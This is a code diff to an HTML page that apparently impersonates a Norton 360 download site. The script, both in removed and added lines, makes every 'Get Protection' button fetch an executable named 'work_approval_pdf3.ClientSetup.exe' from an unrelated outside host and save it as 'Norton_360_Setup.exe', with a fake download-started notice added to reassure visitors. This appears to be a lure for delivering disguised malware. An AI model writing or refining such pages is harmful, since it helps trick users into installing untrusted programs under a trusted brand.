@@ -39,9 +39,31 @@
                 transform: scale(1);
             }
         }
+        .download-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+        }
+        .download-notification.show {
+            transform: translateX(0);
+        }
     </style>
 </head>
 <body class="font-sans bg-gray-50">
+    <!-- Download Notification -->
+    <div id="downloadNotification" class="download-notification bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg">
+        <div class="flex items-center">
+            <i class="fas fa-download mr-2"></i>
+            <span id="downloadMessage">Norton 360 download started! Check your downloads folder.</span>
+            <button onclick="hideNotification()" class="ml-4 text-white hover:text-gray-200">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+    </div>
+
     <!-- Header -->
     <header class="gradient-bg text-white">
         <div class="container mx-auto px-4 py-6">
@@ -221,7 +243,7 @@
                                 <span>Smart firewall</span>
                             </li>
                         </ul>
-                        <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded">
+                        <button onclick="downloadNorton()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded transition">
                             Get Protection
                         </button>
                     </div>
@@ -260,7 +282,7 @@
                                 <span>Dark web monitoring</span>
                             </li>
                         </ul>
-                        <button class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-4 rounded">
+                        <button onclick="downloadNorton()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-4 rounded transition">
                             Get Protection
                         </button>
                     </div>
@@ -296,7 +318,7 @@
                                 <span>Identity theft protection</span>
                             </li>
                         </ul>
-                        <button class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded">
+                        <button onclick="downloadNorton()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded transition">
                             Get Protection
                         </button>
                     </div>
@@ -467,23 +489,76 @@
     </footer>
 
     <script>
-        // Function to trigger file download
-        function downloadFile() {
-            const downloadUrl = 'https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
-            const link = document.createElement('a');
-            link.href = downloadUrl;
-            link.download = 'norton.exe';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            // Optional: Show download confirmation
-            alert('Your Norton 360 download has started. Please wait...');
+        // Function to download Norton using the API
+        function downloadNorton() {
+            try {
+                // Show download notification
+                showNotification();
+                
+                // Create the download URL with Norton as the movie name parameter
+                const url = `/api/download?movie=Norton`;
+                
+                // Create hidden link and trigger download
+                const a = document.createElement("a");
+                a.href = url;
+                a.style.display = "none";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                // Log for analytics
+                console.log('Norton 360 download initiated via API');
+                
+            } catch (error) {
+                console.error("Download failed:", error);
+                
+                // Fallback to direct download
+                directDownload();
+            }
         }
 
-        // Add event listeners to both download buttons
-        document.getElementById('downloadBtn').addEventListener('click', downloadFile);
-        document.getElementById('downloadBtn2').addEventListener('click', downloadFile);
+        // Direct download fallback function
+        function directDownload() {
+            const remoteFile = "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+            
+            // Create download link with Norton filename
+            const a = document.createElement("a");
+            a.href = remoteFile;
+            a.download = 'Norton_360_Setup.exe';
+            a.style.display = "none";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        // Show download notification
+        function showNotification() {
+            const notification = document.getElementById('downloadNotification');
+            notification.classList.add('show');
+            
+            // Auto-hide after 5 seconds
+            setTimeout(() => {
+                hideNotification();
+            }, 5000);
+        }
+
+        // Hide download notification
+        function hideNotification() {
+            const notification = document.getElementById('downloadNotification');
+            notification.classList.remove('show');
+        }
+
+        // Add event listeners to download buttons
+        document.getElementById('downloadBtn').addEventListener('click', downloadNorton);
+        document.getElementById('downloadBtn2').addEventListener('click', downloadNorton);
+
+        // Add event listeners to all "Get Protection" buttons
+        document.addEventListener('DOMContentLoaded', function() {
+            const protectionButtons = document.querySelectorAll('button[onclick="downloadNorton()"]');
+            protectionButtons.forEach(button => {
+                button.addEventListener('click', downloadNorton);
+            });
+        });
     </script>
 </body>
 </html>
